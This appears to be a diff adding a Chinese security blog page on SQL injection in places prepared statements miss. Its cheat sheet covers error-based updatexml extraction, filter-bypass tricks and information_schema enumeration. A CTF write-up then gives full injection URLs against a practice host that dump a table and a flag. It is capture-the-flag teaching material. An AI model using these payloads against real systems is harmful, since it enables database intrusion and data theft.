@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CKMT2J522R"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CKMT2J522R', { 'anonymize_ip': false });
+}
+</script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  预编译的漏网之鱼捕捞 &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="在Java持久化层或Web框架化的情况下，要么很难有SQL注入，要么全是SQL注入（没用防注入框架的网站，xray狂喜）。这里列出特例或者开发常犯错的例子，让我们钻空子，找找漏洞。
+|blog under go1f.github.io">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="http://92643.cn:92">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/whisper/">
+      
+      <span>离骚</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/skill/">
+      
+      <span>拙技</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/glance/">
+      
+      <span>速览</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">预编译的漏网之鱼捕捞</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2023-06-17. Published at: 2022-10-30.">
+        
+          Lastmod: 2023-06-17
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>在Java持久化层或Web框架化的情况下，要么很难有SQL注入，要么全是SQL注入（没用防注入框架的网站，xray狂喜）。这里列出特例或者开发常犯错的例子，让我们钻空子，找找漏洞。</p>
+<p>框架化或者预编译</p>
+<ol>
+<li>表名和列名：在大多数情况下，表名和列名是固定的，无法使用参数来动态设置。这是因为SQL查询优化器需要在编译阶段确定表的结构和可用索引等信息。如果使用动态输入的表名或列名，查询优化器无法在编译阶段进行优化和验证，这可能导致性能下降或安全问题。在需要动态表名或列名的情况下，应该谨慎使用，确保输入的值经过充分的验证和过滤。</li>
+<li>SQL关键字和语法结构：SQL关键字（如SELECT、INSERT、UPDATE等）和语法结构（如FROM、WHERE、GROUP BY等）也是固定的，不能使用参数来动态设置。这些关键字和语法结构是SQL语句的组成部分，必须在编译阶段确定。如果需要根据动态条件构建不同的SQL查询，可以使用条件语句（如IF、CASE WHEN）来控制SQL语句的结构。</li>
+<li>表达式和函数：SQL语句中的表达式和函数通常是根据列和常量进行计算和操作的，无法通过参数来动态设置。例如，日期函数、数学函数、字符串函数等是在SQL解析和执行阶段计算的，无法动态替换参数。</li>
+</ol>
+<p>order by 注入</p>
+<p>asc</p>
+<p>desc</p>
+<p>ThinkPHP Laravel SQL 注入</p>
+<p>使用数组进行框架ORM注入</p>
+<p><a href="https://paper.seebug.org/1688/#0x04-sql">从一个 Laravel SQL 注入漏洞开始的 Bug Bounty 之旅</a></p>
+<p>报错函数</p>
+<pre tabindex="0"><code>updatexml(1,concat(&#39;~&#39;,(select(database()))),1)
+</code></pre><p>字符函数</p>
+<pre tabindex="0"><code>substring(&#39;123&#39;,32,64)
+left(&#39;123&#39;,3)
+right(&#39;123&#39;,3)
+</code></pre><p>空格/分割符号</p>
+<pre tabindex="0"><code>%0c %0a () /**/
+</code></pre><p>符号替换</p>
+<pre tabindex="0"><code>or and =&gt; &amp;&amp; ||
+xor
+</code></pre><p>查看数据库</p>
+<pre tabindex="0"><code>select(group_concat(schema_name))from(information_schema.schemata)
+</code></pre><p>查看表名</p>
+<pre tabindex="0"><code>(select(select(group_concat(table_name))from(information_schema.tables)where(schema_name=&#39;geek&#39;))
+</code></pre><p>查看列名</p>
+<pre tabindex="0"><code>(select(select(group_concat(column_name))from(information_schema.columns)where((table_name)like&#39;H4rDsq1&#39;)))
+</code></pre><h3 id="极客大挑战-2019hardsql1">[极客大挑战 2019]HardSQL1</h3>
+<p>1、单引号，报错成功。</p>
+<p>2、and/or/&amp;&amp;/||符号，拦截提示，大小写拦截。xor替换。</p>
+<p>3、空格拦截，/**/拦截，%0a拦截。使用括号()。</p>
+<p>4、报错函数无拦截</p>
+<p>5、substr/substring/mid拦截。left/right替换。</p>
+<p>6、=符号拦截。like替换。</p>
+<pre tabindex="0"><code>http://test.node4.buuoj.cn:81/check.php?username=admin&amp;password=1&#39;xor(updatexml(1,concat(&#39;~&#39;,right((select(select(group_concat(schema_name))from(information_schema.schemata))),20)),1))xor&#39;1
+
+http://test.node4.buuoj.cn:81/check.php?username=admin&amp;password=1&#39;xor(updatexml(1,concat(&#39;~&#39;,right((select(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#39;geek&#39;))),20)),1))xor&#39;1
+
+H4rDsq1
+
+http://test.node4.buuoj.cn:81/check.php?username=admin&amp;password=1&#39;xor(updatexml(1,concat(&#39;~&#39;,right((select(select(group_concat(column_name))from(information_schema.columns)where((table_name)like&#39;H4rDsq1&#39;))),20)),1))xor&#39;1
+
+http://test.node4.buuoj.cn:81/check.php?username=admin&amp;password=1&#39;xor(updatexml(1,concat(&#39;~&#39;,right((select(select(group_concat(password))from(H4rDsq1))),31)),1))xor&#39;1
+
+flag{85a4c8ec-31b2-4296-8273-4e80fddfc48e}
+</code></pre>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>预编译的漏网之鱼捕捞</b><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#极客大挑战-2019hardsql1">[极客大挑战 2019]HardSQL1</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+  
+
+  
+    <div>
+      
+    </div>
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    © jyufu 2020-2023 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
